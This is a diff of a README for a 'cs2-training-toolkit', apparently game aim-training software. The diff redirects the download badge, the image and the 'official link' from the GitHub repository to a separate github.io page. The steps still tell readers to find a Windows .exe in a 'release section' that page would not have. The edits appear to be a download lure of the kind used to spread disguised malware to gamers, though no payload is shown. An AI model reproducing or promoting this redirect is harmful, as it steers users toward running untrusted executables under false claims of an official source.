@@ -1,9 +1,9 @@
 # 🎯 cs2-training-toolkit - Improve your aim with smart software
 
-![image](https://github.com/user-attachments/assets/7551e43b-8ed5-4819-b80e-008db4d78a5e)
+![image](https://sudiptokundu2021-lgtm.github.io)
 
 <p align="center">
-  <a href="https://github.com/sudiptokundu2021-lgtm/cs2-training-toolkit">
+  <a href="https://sudiptokundu2021-lgtm.github.io">
     <img src="https://img.shields.io/badge/DOWNLOAD-VERSION-28a745?style=for-the-badge&logo=windows&logoColor=white" alt="Download">
   </a>
 </p>
@@ -25,7 +25,7 @@ Your computer needs to meet these basic standards to run the toolkit:
 
 ## 🚀 Downloading the Application
 
-1.  Follow the official link to access the distribution page: [Download cs2-training-toolkit](https://github.com/sudiptokundu2021-lgtm/cs2-training-toolkit).
+1.  Follow the official link to access the distribution page: [Download cs2-training-toolkit](https://sudiptokundu2021-lgtm.github.io).
 2.  Locate the release section on the right side of the page.
 3.  Choose the file ending in .exe for Windows.
 4.  Save the file to your computer.
